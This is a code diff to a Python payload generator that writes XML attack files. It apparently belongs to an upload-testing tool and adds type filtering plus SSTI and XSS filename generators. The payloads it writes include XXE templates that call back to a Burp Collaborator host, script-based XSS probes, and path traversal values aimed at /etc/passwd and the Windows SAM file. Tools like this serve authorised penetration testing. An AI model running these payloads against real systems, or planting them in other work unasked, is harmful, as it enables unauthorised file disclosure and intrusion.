@@ -1,16 +1,35 @@
 from pathlib import Path
 
-def generate_xml_payloads(output_dir, burp_collab):
+try:
+    from .ssti_filename_generator import generate_ssti_filename_payloads
+    from .xss_filename_generator import generate_xss_filename_payloads
+except ImportError:
+    try:
+        from ssti_filename_generator import generate_ssti_filename_payloads
+        from xss_filename_generator import generate_xss_filename_payloads
+    except ImportError:
+        generate_ssti_filename_payloads = None
+        generate_xss_filename_payloads = None
+
+def generate_xml_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
+    if payload_types is None:
+        payload_types = {'all'}
+    
+    def should_generate_type(payload_type):
+        return 'all' in payload_types or payload_type in payload_types
     output_dir = Path(output_dir)
     output_dir.mkdir(parents=True, exist_ok=True)
     base_url = f"http://{burp_collab}"
     
-    xxe_dir = output_dir / 'xxe'
-    xxe_dir.mkdir(exist_ok=True)
-    xss_dir = output_dir / 'xss'
-    xss_dir.mkdir(exist_ok=True)
-    path_traversal_dir = output_dir / 'path_traversal'
-    path_traversal_dir.mkdir(exist_ok=True)
+    if should_generate_type('xxe'):
+        xxe_dir = output_dir / 'xxe'
+        xxe_dir.mkdir(exist_ok=True)
+    if should_generate_type('xss'):
+        xss_dir = output_dir / 'xss'
+        xss_dir.mkdir(exist_ok=True)
+    if should_generate_type('path_traversal'):
+        path_traversal_dir = output_dir / 'path_traversal'
+        path_traversal_dir.mkdir(exist_ok=True)
     
     xml_xxe1_entity = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -19,8 +38,9 @@ def generate_xml_payloads(output_dir, burp_collab):
 <root>
 <data>&xxe;</data>
 </root>'''
-    with open(xxe_dir / "xxe1_entity.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_xxe1_entity)
+    if should_generate_type('xxe'):
+        with open(xxe_dir / "xxe1_entity.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_xxe1_entity)
     
     xml_xxe2_https = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -29,8 +49,9 @@ def generate_xml_payloads(output_dir, burp_collab):
 <root>
 <data>&xxe;</data>
 </root>'''
-    with open(xxe_dir / "xxe2_https.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_xxe2_https)
+    if should_generate_type('xxe'):
+        with open(xxe_dir / "xxe2_https.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_xxe2_https)
     
     xml_xxe3_file = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -39,8 +60,9 @@ def generate_xml_payloads(output_dir, burp_collab):
 <root>
 <data>&xxe;</data>
 </root>'''
-    with open(xxe_dir / "xxe3_file.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_xxe3_file)
+    if should_generate_type('xxe'):
+        with open(xxe_dir / "xxe3_file.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_xxe3_file)
     
     xml_xxe4_parameter = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -50,8 +72,9 @@ def generate_xml_payloads(output_dir, burp_collab):
 <root>
 <data>test</data>
 </root>'''
-    with open(xxe_dir / "xxe4_parameter.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_xxe4_parameter)
+    if should_generate_type('xxe'):
+        with open(xxe_dir / "xxe4_parameter.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_xxe4_parameter)
     
     xml_xxe5_doctype = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -60,22 +83,25 @@ def generate_xml_payloads(output_dir, burp_collab):
 <root>
 <data>&xxe;</data>
 </root>'''
-    with open(xxe_dir / "xxe5_doctype.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_xxe5_doctype)
+    if should_generate_type('xxe'):
+        with open(xxe_dir / "xxe5_doctype.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_xxe5_doctype)
     
     xml_xss1_script = f'''<?xml version="1.0" encoding="UTF-8"?>
 <root>
 <script>alert(1)</script>
 </root>'''
-    with open(xss_dir / "xss1_script.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_xss1_script)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss1_script.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_xss1_script)
     
     xml_xss2_cdata = f'''<?xml version="1.0" encoding="UTF-8"?>
 <root>
 <data><![CDATA[<script>alert(1)</script>]]></data>
 </root>'''
-    with open(xss_dir / "xss2_cdata.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_xss2_cdata)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss2_cdata.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_xss2_cdata)
     
     xml_xss3_svg = f'''<?xml version="1.0" encoding="UTF-8"?>
 <root>
@@ -83,30 +109,34 @@ def generate_xml_payloads(output_dir, burp_collab):
 <rect width="100" height="100" fill="red"/>
 </svg>
 </root>'''
-    with open(xss_dir / "xss3_svg.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_xss3_svg)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss3_svg.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_xss3_svg)
     
     xml_xss4_stylesheet = f'''<?xml version="1.0" encoding="UTF-8"?>
 <?xml-stylesheet href="javascript:alert(1)"?>
 <root>
 <data>test</data>
 </root>'''
-    with open(xss_dir / "xss4_stylesheet.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_xss4_stylesheet)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss4_stylesheet.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_xss4_stylesheet)
     
     xml_path1_relative = f'''<?xml version="1.0" encoding="UTF-8"?>
 <root>
 <file>../../../etc/passwd</file>
 </root>'''
-    with open(path_traversal_dir / "path1_relative.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_path1_relative)
+    if should_generate_type('path_traversal'):
+        with open(path_traversal_dir / "path1_relative.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_path1_relative)
     
     xml_path2_windows = f'''<?xml version="1.0" encoding="UTF-8"?>
 <root>
 <file>..\\..\\..\\windows\\system32\\config\\sam</file>
 </root>'''
-    with open(path_traversal_dir / "path2_windows.xml", 'w', encoding='utf-8') as f:
-        f.write(xml_path2_windows)
+    if should_generate_type('path_traversal'):
+        with open(path_traversal_dir / "path2_windows.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_path2_windows)
     
     master_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -119,3 +149,9 @@ def generate_xml_payloads(output_dir, burp_collab):
 </root>'''
     with open(output_dir / "master.xml", 'w', encoding='utf-8') as f:
         f.write(master_xml)
+    
+    if generate_ssti_filename_payloads and should_generate_type('ssti'):
+        generate_ssti_filename_payloads(output_dir, 'xml', burp_collab, tech_filter)
+    
+    if generate_xss_filename_payloads and should_generate_type('xss'):
+        generate_xss_filename_payloads(output_dir, 'xml', burp_collab, tech_filter)
